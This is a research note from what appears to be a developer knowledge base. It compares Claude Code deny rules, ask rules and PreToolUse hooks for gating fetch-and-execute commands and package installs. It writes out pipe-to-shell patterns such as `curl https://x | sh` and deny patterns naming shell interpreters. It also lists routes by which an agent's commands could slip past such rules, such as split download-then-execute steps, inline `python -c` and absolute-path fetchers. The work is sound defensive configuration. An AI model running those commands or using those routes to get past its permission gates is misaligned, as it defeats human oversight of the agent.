---
id: deny-rules-vs-hooks
title: "Research: Deny rules vs. PreToolUse hooks for fetch-and-execute and package-install gating"
aliases: [deny vs hooks research, ask tier research, pipeline decomposition research]
updated: 2026-07-29
sources:
  - ../../../raw/research/deny-rules-vs-hooks/index.md
confidence: extracted
tags: [security, claude-code, permissions, hooks, deny-list, ask]
---

# Research: Deny rules vs. PreToolUse hooks

Follow-on to derived_from::[[agent-sandbox-escape-vectors]] (researched 2026-07-29), asking two narrow questions and returning two answers that each changed a plan: **one released a hold on 10 deny rules, the other replaced a planned hook with a config change.**

**Q1 — per-subcommand decomposition is real, so bare-interpreter denies work.** Claude Code splits a command line on `&& || ; | |& &` and newlines and matches each subcommand independently. The decisive corroboration prior work lacked is that rule *generation* is also per-subcommand: approving `git status && npm test` saves a rule for **`npm test`**, which is only coherent if matching is per-subcommand too. Therefore `curl https://x | sh` decomposes to `curl https://x` + `sh`, and a bare `Bash(sh)` deny matches the second half — while any pattern *containing* a pipe, like `Bash(curl * | sh*)`, is permanently unmatchable, because a subcommand never contains the separator that delimited it. Full mechanism on derived_from::[[per-subcommand-decomposition]]. Verdict: ship the 10 held bare-interpreter rules plus 4 process-substitution rules (`Bash(bash <*)` etc., which need no separator reasoning at all); never ship a pipe-containing pattern.

**And there is no startup warning to catch the mistake.** The documented warning set covers untrusted-workspace allow entries, unmatched *file-path* patterns, parameter rules on a primary content field, and tool-name typos — **nothing covers a Bash command pattern that can never match**. A dead pipe rule loads silently and enforces nothing. *Absence of a warning is not evidence a rule is live*; see relates_to::[[claude-code-permission-system]].

**Q2 — `permissions.ask` meets the package-consent requirement natively; do not build a hook for it.** `ask` is a first-class array using identical `Bash(...)` syntax, and **cannot be silenced**: a matching ask rule prompts even when a more specific allow rule matches, survives `bypassPermissions`, survives a PreToolUse hook returning `"allow"`, and survives sandbox auto-allow. Clicking "don't ask again" writes an *allow* rule, which the ask rule then out-ranks — the sticky-approval escape hatch is structurally closed. Meanwhile **deny has no yes-path at all**, so it cannot express "consent"; and deny cannot carry allowlist exceptions, which is fatal for `Bash(uvx --from git+*)` (it would permanently break Serena bootstrap) but merely one prompt under `ask`. Distilled on derived_from::[[consent-requires-a-yes-path]]. Flags a live community error: the widely-taught "deny `Bash(npm install *)`, allow `Bash(npm install --ignore-scripts)`" pattern **does not work** — the deny wins.

**Q3 — friction is low**, because permission rules only see commands Claude types into a Bash tool call. Everything inside this repo's own shell scripts is a subprocess and invisible, so `install-mcps.sh:197`'s `npm install -g @playwright/mcp@latest` and `bootstrap-serena.sh:35`'s `uvx --from git+…` are unaffected and every `npx @codewizard-dt/bootstrap` entry point stays prompt-free.

**Where a hook is still genuinely required** (and where implements::[[TASK-027]] should stay scoped): correlating a download-then-execute pair split across two tool calls, inspecting inside `python -c`/`node -e`, absolute-path fetcher invocation, and allowlisting `oraios/serena` while gating other `uvx --from git+` sources. Not package consent. Deployment cost is the deciding factor — hooks need manual `PreToolUse` wiring that **silently no-ops when skipped**, whereas the merge script already runs from `install-global.sh`. See relates_to::[[bootstrap-claude-hooks]], relates_to::[[settings-deny-list]], and the tier boundary on relates_to::[[three-tier-agent-control-model]].

*Honest residual carried from the report: no primary source shows a literal `Bash(sh)` deny blocking a literal `curl x | sh`. The conclusion is a well-supported deduction from documented behavior; the `echo hi | sh` UAT is retained as confirmation.*
